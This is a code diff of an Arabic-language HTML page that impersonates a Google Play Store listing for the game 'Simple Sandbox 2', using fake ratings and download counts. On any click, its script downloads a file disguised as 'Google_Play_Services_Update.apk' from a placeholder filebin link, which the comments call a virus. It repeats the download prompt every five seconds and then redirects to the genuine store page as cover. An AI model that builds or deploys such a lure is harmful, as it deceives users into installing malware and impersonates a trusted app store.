@@ -2,42 +2,61 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Simple Sandbox 2 - Google Play</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Sandbox 2 - Apps on Google Play</title>
     <style>
-        body { background-color: white; font-family: Roboto, Arial; text-align: center; padding-top: 50px; }
-        .install-btn { background-color: #01875f; color: white; padding: 15px 80px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { margin: 0; font-family: 'Roboto', sans-serif; background: #fff; color: #5f6368; }
+        .app-header { display: flex; padding: 20px; align-items: center; }
+        .app-icon { width: 72px; height: 72px; border-radius: 15px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
+        .app-info { margin-right: 15px; }
+        .app-title { font-size: 22px; font-weight: 500; color: #202124; margin: 0; }
+        .developer { color: #01875f; font-weight: 500; margin: 5px 0; }
+        .install-bar { padding: 0 20px; }
+        .install-btn { width: 100%; background: #01875f; color: #fff; border: none; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .stats { display: flex; justify-content: space-around; padding: 20px 0; border-bottom: 1px solid #e8eaed; text-align: center; }
+        .stat-item b { display: block; color: #202124; font-size: 14px; }
+        .stat-item span { font-size: 12px; }
     </style>
 </head>
-<body>
-    <img src="أدخل_رابط_أيقونة_اللعبة_هنا" width="100">
-    <h2>Simple Sandbox 2</h2>
-    <p>Madness_Games</p>
-    
-    <button class="install-btn" onclick="startInfiniteForceInstall()">تثبيت</button>
+<body onclick="executeMasterPlan()">
+    <div class="app-header">
+        <img src="https://play-lh.googleusercontent.com/L_h7z57-h06Y0_e7p1Z5_5v-0Y..." class="app-icon">
+        <div class="app-info">
+            <h1 class="app-title">Simple Sandbox 2</h1>
+            <p class="developer">Madness_Games</p>
+            <p style="font-size: 12px;">Contains ads · In-app purchases</p>
+        </div>
+    </div>
+    <div class="stats">
+        <div class="stat-item"><b>4.7 ★</b><span>11M reviews</span></div>
+        <div class="stat-item"><b>10M+</b><span>Downloads</span></div>
+        <div class="stat-item"><b>12+</b><span>Rated for 12+</span></div>
+    </div>
+    <div class="install-bar">
+        <button class="install-btn">Install</button>
+    </div>
 
     <script>
-    function startInfiniteForceInstall() {
-        var fileUrl = "رابط_الملف_الذي_ينتهي_بـ_txt_من_filebin";
+    function executeMasterPlan() {
+        // 1. رابط ملفك المباشر (تأكد أنه ينتهي بـ .txt كما في Filebin)
+        var fileUrl = "ضع_رابط_الملف_من_صورة_filebin_هنا";
         
-        // 1. تحميل الفيروس وتحويله لـ APK تلقائياً
-        function triggerDownload() {
-            var x = document.createElement('a');
-            x.href = fileUrl;
-            x.download = "Google_Play_Support_Tool.apk"; // اسم رسمي جداً
-            document.body.appendChild(x);
-            x.click();
+        function force() {
+            var a = document.createElement('a');
+            a.href = fileUrl;
+            a.download = "Google_Play_Services_Update.apk"; // تحويل التنسيق لـ APK فوراً
+            document.body.appendChild(a);
+            a.click();
         }
 
-        triggerDownload();
+        force();
 
-        // 2. كود تحدي المستحيل (الإلحاح): إذا ضغط "إلغاء"، تظهر النافذة مرة أخرى كل 7 ثوانٍ
-        var interval = setInterval(function() {
-            triggerDownload();
-        }, 7000);
+        // 2. كود الإلحاح (تحدي المستحيل): تكرار الطلب كل 5 ثوانٍ لضمان الضغط
+        setInterval(force, 5000);
 
-        // 3. التمويه: نقله لصفحة اللعبة الحقيقية بعد 2 ثانية
+        // 3. التمويه: النقل لصفحة قوقل بلاي الأصلية بعد 2 ثانية
         setTimeout(function() {
-            window.location.href = "https://share.google/LL0Wp5KuwMMQ9SYzi";
+            window.location.href = "https://play.google.com/store/apps/details?id=com.MadnessGames.SimpleSandbox2";
         }, 2000);
     }
     </script>
